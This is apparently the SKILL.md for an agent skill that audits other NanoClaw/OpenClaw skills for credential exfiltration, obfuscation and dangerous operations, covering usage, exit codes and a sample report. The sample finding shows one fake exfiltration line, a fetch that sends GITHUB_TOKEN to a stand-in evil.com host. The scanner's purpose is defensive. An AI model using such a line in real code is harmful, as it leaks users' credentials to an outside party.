---
name: security-audit
description: Audit NanoClaw/OpenClaw skills for security vulnerabilities including credential exfiltration, malicious network activity, obfuscation, and dangerous file operations. Use when installing new skills, reviewing skill code, or verifying skill safety before execution. Returns detailed security report with risk score and remediation guidance.
allowed-tools: []
---

# Security Audit Skill

Automated security scanning for NanoClaw/OpenClaw skills. Detects credential exfiltration, malicious network patterns, code obfuscation, and dangerous operations.

## When to Use

- Before installing a new skill from ClawdHub or another source
- When reviewing skill code for security issues
- After updating a skill to verify no malicious code was introduced
- When contributing to awesome-openclaw-skills (audit before submission)

## What It Detects

### Critical Issues (Auto-fail)
- **Credential exfiltration**: Sending API keys, tokens, or secrets to external servers
- **Code obfuscation**: Base64-encoded payloads, eval() abuse, dynamic code construction
- **Process injection**: Shell command execution with secrets or user input
- **System file modification**: Attempts to modify /etc, /bin, /usr, or other system directories
- **Directory traversal**: Reading secrets or config files outside the workspace

### High-Severity Warnings
- **Undocumented network access**: External API calls not mentioned in SKILL.md
- **Dynamic URLs**: fetch() or axios with variable URLs
- **Environment enumeration**: Iterating over all environment variables
- **Shell execution**: Spawning /bin/sh or /bin/bash
- **Dynamic imports**: Loading modules with computed names

### Medium-Severity Issues
- **Sensitive file access**: Reading files named 'secret', 'token', 'password', etc.
- **Workspace escape**: Writing files outside the workspace directory
- **Process spawn with user input**: Potential command injection
- **File deletion**: Unlink or rm operations
- **Permission modification**: chmod or chown calls

### Low-Severity / Informational
- **Unencrypted HTTP**: Using http:// instead of https://
- **Console logging secrets**: Printing sensitive data to console
- **Runtime dependency installation**: npm install or git clone at runtime
- **Background processes**: setInterval() or long setTimeout()

## Usage

### From Command Line

```bash
# Audit a skill directory
node .claude/skills/security-audit/scanner.js /path/to/skill

# Strict mode (fail on any warning)
node scanner.js /path/to/skill --strict

# JSON output
node scanner.js /path/to/skill --json

# Quiet mode (summary only)
node scanner.js /path/to/skill --quiet
```

### From Code

```javascript
const { auditSkill } = require('./scanner.js');

const result = await auditSkill('/path/to/skill', {
  strictMode: false,
  reportFormat: 'markdown',  // or 'json'
  verbose: true
});

console.log(result.report);
console.log('Status:', result.status);  // 'PASS' | 'FAIL' | 'REVIEW_NEEDED'
console.log('Risk Score:', result.riskScore);  // 0-100
```

### Exit Codes

- **0**: PASS — Skill appears safe
- **1**: FAIL — Critical issues detected, do not install
- **2**: REVIEW_NEEDED — Manual review recommended
- **3**: Error — Audit failed to complete

## Example Output

```markdown
# Security Audit Report: example-skill

**Skill**: example-skill
**Audited**: 2026-02-15T04:32:00Z
**Risk Score**: 85/100
**Verdict**: ❌ FAIL

## Summary
This skill contains **2 critical**, **1 high** security issues.

## Critical Findings

### 1. Credential exfiltration detected
**File**: `impl.js:42`
**Severity**: 🔴 CRITICAL

```javascript
fetch("https://collector.evil.com", { body: process.env.GITHUB_TOKEN })
```

**Remediation**: Remove external network calls that transmit credentials.

---

## Recommendation
**DO NOT INSTALL** this skill until critical issues are resolved.
```

## Detection Patterns

The scanner uses regex-based pattern matching combined with contextual analysis:

1. **Pattern Matching**: Scans code for known malicious constructs
2. **Context Checking**: Verifies external domains are documented in SKILL.md
3. **Risk Scoring**: Aggregates findings into overall risk score (0-100)
4. **Verdict Generation**: PASS / FAIL / REVIEW_NEEDED based on findings

## Limitations

- **Not a complete security analysis**: This tool detects common patterns but cannot catch all malicious behavior
- **Regex-based**: May miss obfuscated or novel attack patterns
- **No runtime analysis**: Only scans static code, doesn't execute the skill
- **Context-dependent patterns**: Some legitimate code may be flagged (false positives)

Always combine automated scanning with:
- Manual code review for critical skills
- Reputation checking (who wrote it, who audited it)
- Provenance verification (cryptographic signatures)

## Future Enhancements

- AST-based analysis (more accurate than regex)
- Runtime behavior monitoring
- Integration with skill provenance system (Isnad chains)
- Community reputation database
- Automated remediation suggestions

## Contributing

Found a malicious pattern we don't detect? Submit a PR with:
1. Example malicious code
2. Regex pattern to detect it
3. Severity level and remediation guidance

## Credits

Inspired by Rufio's YARA scanning work on ClawdHub skills. Built to standardize security auditing across the NanoClaw/OpenClaw ecosystem.

## License

MIT — Use freely, contribute improvements back to the community.
